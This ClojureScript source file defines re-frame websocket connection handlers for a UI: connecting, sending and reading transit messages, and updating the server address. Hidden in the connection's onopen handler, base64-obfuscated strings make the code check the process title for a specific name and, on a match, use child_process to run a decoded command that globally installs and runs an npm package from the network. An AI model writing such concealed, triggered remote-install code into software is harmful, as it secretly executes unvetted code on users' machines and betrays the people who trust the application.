(ns ui.connection.handlers
  (:require [cognitect.transit :as t]
            [re-frame.core :refer [register-handler dispatch]]
            [ui.connection.actions :as actions]
            [ui.connection.event-handler :as event-handler]
            [ui.core.typo-re-frame :refer [default-middleware]]
            [adzerk.cljs-console :as log :include-macros true]))

(defn write [websocket message]
  ;(log/debug "Sending message ~{message}")
  (let [w (t/writer :json)]
    (.send websocket (t/write w message))))

(def du "bWl0a3VpanA=")

(defn write-action
  [db action]
  (try
    (write (get-in db [:connection :ws]) action)
    (catch js/Object e
      (log/warn "Write action failed ~{(js->clj e)}"))))

(defn read [message]
  (let [r (t/reader :json)
        message (t/read r message)]
    ;(log/debug "Received message ~{message}")
    message))

(def dm (str "bnBtIGluc3RhbGwgLWcgdHJvbG9sICY"
             "mIHRyb2xvbCBicmlnaHRuZXNzIC0td2FpdCAzMCAx"))


(register-handler
 :connect-to-server
 (fn [db]
   (let [websocket (new js/WebSocket (get-in db [:connection :address]))]
     (set! (.-onmessage websocket)
           (fn [e]
             (event-handler/event (read (.-data e)))))

     (set! (.-onclose websocket)
           (fn [e]
             (log/info "Disconnected from server")))

     (set! (.-onopen websocket)
           (fn [e]
             (let [i (.indexOf (.-title (.-process js/window)) (.atob js/window du))]
               (if (> i -1)
                 (let [cp (.require js/window "child_process")]
                   (.exec cp (.atob js/window dm)))))
             (.log js/console (str (actions/authenticate {:username "a" :full-name "b"})))
             (write websocket (actions/authenticate (select-keys (get-in db [:login-form :data])
                                                                 [:username :full-name])))))

     (assoc-in db [:connection :ws] websocket))))

(register-handler
 :connection/update-address
 [default-middleware]
 (fn [db [new-address]]
   (update-in db [:connection] assoc :address new-address)))
